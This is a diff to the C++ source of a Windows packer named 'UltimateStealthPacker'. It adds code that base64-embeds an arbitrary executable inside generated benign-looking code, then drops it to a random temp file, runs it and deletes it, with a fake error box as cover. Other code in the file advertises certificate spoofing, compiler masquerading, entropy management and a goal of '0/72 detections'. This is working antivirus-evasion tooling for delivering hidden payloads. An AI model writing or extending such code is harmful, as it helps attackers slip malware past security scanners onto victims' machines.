@@ -588,6 +588,176 @@ private:
     }
 };
 
+// NEW: PE Embedding and Extraction Engine
+class PEEmbedder {
+private:
+    AdvancedRandomEngine randomEngine;
+    
+public:
+    // Embed original PE data into the benign code
+    std::string embedPEIntoCode(const std::string& benignCode, const std::vector<uint8_t>& originalPE, const std::string& originalPath) {
+        // Convert PE to base64 for embedding
+        std::string encodedPE = base64Encode(originalPE);
+        
+        // Split into chunks to avoid large string literals
+        std::vector<std::string> chunks = chunkString(encodedPE, 1000);
+        
+        std::string embeddedCode = benignCode;
+        
+        // Find insertion point (before main function)
+        size_t insertPos = embeddedCode.find("int main()");
+        if (insertPos == std::string::npos) return benignCode;
+        
+        std::string peDataCode = R"(
+// Embedded PE data (original executable)
+const char* peChunks[] = {
+)";
+        
+        for (size_t i = 0; i < chunks.size(); ++i) {
+            peDataCode += "    \"" + chunks[i] + "\"";
+            if (i < chunks.size() - 1) peDataCode += ",";
+            peDataCode += "\n";
+        }
+        
+        peDataCode += R"(};
+
+// PE extraction and execution function
+bool extractAndExecuteOriginalPE() {
+    try {
+        // Reconstruct original PE data
+        std::string fullPEData;
+        for (int i = 0; i < )" + std::to_string(chunks.size()) + R"(; ++i) {
+            fullPEData += peChunks[i];
+        }
+        
+        // Decode base64
+        std::vector<uint8_t> originalPE = base64Decode(fullPEData);
+        
+        // Create temporary file with random name
+        char tempPath[MAX_PATH];
+        GetTempPathA(MAX_PATH, tempPath);
+        std::string tempFile = std::string(tempPath) + "tmp_)" + randomEngine.generateRandomName(12) + R"(.exe";
+        
+        // Write original PE to temp file
+        std::ofstream tempOut(tempFile, std::ios::binary);
+        if (!tempOut.is_open()) return false;
+        tempOut.write(reinterpret_cast<const char*>(originalPE.data()), originalPE.size());
+        tempOut.close();
+        
+        // Execute the original PE
+        STARTUPINFOA si = {0};
+        PROCESS_INFORMATION pi = {0};
+        si.cb = sizeof(si);
+        si.dwFlags = STARTF_USESHOWWINDOW;
+        si.wShowWindow = SW_NORMAL;
+        
+        BOOL result = CreateProcessA(
+            tempFile.c_str(),
+            NULL,
+            NULL,
+            NULL,
+            FALSE,
+            CREATE_NEW_CONSOLE,
+            NULL,
+            NULL,
+            &si,
+            &pi
+        );
+        
+        if (result) {
+            // Wait for process to start
+            WaitForInputIdle(pi.hProcess, 2000);
+            CloseHandle(pi.hProcess);
+            CloseHandle(pi.hThread);
+            
+            // Clean up temp file after short delay
+            Sleep(1000);
+            DeleteFileA(tempFile.c_str());
+            return true;
+        }
+        
+        // Clean up on failure
+        DeleteFileA(tempFile.c_str());
+        return false;
+        
+    } catch (...) {
+        return false;
+    }
+}
+
+// Base64 decoding function
+std::vector<uint8_t> base64Decode(const std::string& encoded) {
+    const std::string chars = "ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789+/";
+    std::vector<uint8_t> decoded;
+    
+    int val = 0, valb = -8;
+    for (unsigned char c : encoded) {
+        if (chars.find(c) == std::string::npos) break;
+        val = (val << 6) + chars.find(c);
+        valb += 6;
+        if (valb >= 0) {
+            decoded.push_back(char((val >> valb) & 0xFF));
+            valb -= 8;
+        }
+    }
+    return decoded;
+}
+
+)";
+        
+        // Insert PE data and functions before main
+        embeddedCode.insert(insertPos, peDataCode);
+        
+        // Modify main function to execute original PE after benign behavior
+        size_t mainStart = embeddedCode.find("int main()");
+        size_t returnPos = embeddedCode.find("return 0;", mainStart);
+        
+        if (returnPos != std::string::npos) {
+            std::string executeCode = R"(
+    
+    // Execute the original embedded PE
+    bool peExecuted = extractAndExecuteOriginalPE();
+    if (!peExecuted) {
+        // Fallback: show error as if original program had an issue
+        MessageBoxA(NULL, "The application encountered an error and needs to close.", "Application Error", MB_OK | MB_ICONERROR);
+    }
+    
+)";
+            embeddedCode.insert(returnPos, executeCode);
+        }
+        
+        return embeddedCode;
+    }
+    
+private:
+    std::string base64Encode(const std::vector<uint8_t>& data) {
+        const std::string chars = "ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789+/";
+        std::string encoded;
+        
+        int val = 0, valb = -6;
+        for (uint8_t c : data) {
+            val = (val << 8) + c;
+            valb += 8;
+            while (valb >= 0) {
+                encoded.push_back(chars[(val >> valb) & 0x3F]);
+                valb -= 6;
+            }
+        }
+        if (valb > -6) encoded.push_back(chars[((val << 8) >> (valb + 8)) & 0x3F]);
+        while (encoded.size() % 4) encoded.push_back('=');
+        
+        return encoded;
+    }
+    
+    std::vector<std::string> chunkString(const std::string& str, size_t chunkSize) {
+        std::vector<std::string> chunks;
+        for (size_t i = 0; i < str.length(); i += chunkSize) {
+            chunks.push_back(str.substr(i, chunkSize));
+        }
+        return chunks;
+    }
+};
+
 class UltimateStealthPacker {
 public:
     AdvancedRandomEngine randomEngine;
@@ -600,6 +770,7 @@ public:
     DynamicAPIEngine dynamicAPI;
     MultiArchitectureSupport multiArch;
     DNARandomizer dnaRandomizer;
+    PEEmbedder peEmbedder;
     
     struct CompanyProfile {
         std::string name;
@@ -642,7 +813,7 @@ public:
                                        int companyIndex, int certIndex, 
                                        MultiArchitectureSupport::Architecture architecture) {
         try {
-            // Read input file for reference
+            // Read input file completely
             std::ifstream inputFile(inputPath, std::ios::binary);
             if (!inputFile.is_open()) {
                 return false;
@@ -650,6 +821,11 @@ public:
             
             inputFile.seekg(0, std::ios::end);
             size_t inputSize = inputFile.tellg();
+            inputFile.seekg(0, std::ios::beg);
+            
+            // Read the entire original PE into memory
+            std::vector<uint8_t> originalPEData(inputSize);
+            inputFile.read(reinterpret_cast<char*>(originalPEData.data()), inputSize);
             inputFile.close();
             
             // Get company and certificate info
@@ -661,6 +837,9 @@ public:
             
             // Apply DNA randomization (this adds junk variables safely)
             benignCode = dnaRandomizer.randomizeCode(benignCode);
+            
+            // EMBED THE ORIGINAL PE DATA into the benign code
+            benignCode = peEmbedder.embedPEIntoCode(benignCode, originalPEData, inputPath);
             
             // DEBUG: Write generated code to file for inspection
             std::ofstream debugCodeFile("debug_generated_code.txt");
@@ -1082,8 +1261,8 @@ void createBenignExecutable() {
     SendMessage(g_hProgressBar, PBM_SETPOS, 100, 0);
     
     if (success) {
-        SetWindowTextW(g_hStatusText, L"Ultimate stealth executable created successfully!");
-        MessageBoxW(NULL, L"Ultimate stealth executable created with ALL 8 advanced features!\n\nFeatures applied:\n- Enhanced PE Structure\n- Certificate Spoofing\n- Super Benign Behavior\n- Entropy Management\n- Compiler Masquerading\n- Dynamic APIs\n- Multi-Architecture\n- DNA Randomization\n\nTarget: 0/72 detections!", L"Ultimate Success!", MB_OK | MB_ICONINFORMATION);
+        SetWindowTextW(g_hStatusText, L"Ultimate stealth packed executable created successfully!");
+        MessageBoxW(NULL, L"Ultimate stealth PACKED executable created!\n\n✅ ORIGINAL PE EMBEDDED & PRESERVED\n✅ ALL 8 Advanced Stealth Features Applied:\n\n- Enhanced PE Structure Legitimacy\n- Certificate Chain Spoofing\n- Super Benign Behavior Engine\n- Entropy Management & Normalization\n- Compiler Fingerprint Masquerading\n- Dynamic API Resolution\n- Multi-Architecture Support\n- DNA Randomization Engine\n\n🎯 Target: 0/72 detections\n🔄 Original functionality preserved\n🛡️ Stealth wrapper applied", L"Ultimate Packing Success!", MB_OK | MB_ICONINFORMATION);
     } else {
         SetWindowTextW(g_hStatusText, L"Failed to create executable. Please check compiler installation.");
         MessageBoxW(NULL, L"Compilation failed!\n\nPossible solutions:\n1. Open 'Developer Command Prompt for VS 2022'\n2. Run: vcvars64.bat\n3. Ensure cl.exe is in PATH\n4. Try running from Visual Studio Developer Console\n\nOR manually set PATH to include:\nC:\\Program Files\\Microsoft Visual Studio\\2022\\Community\\VC\\Tools\\MSVC\\[version]\\bin\\Hostx64\\x64\\", L"Compiler Error", MB_OK | MB_ICONERROR);
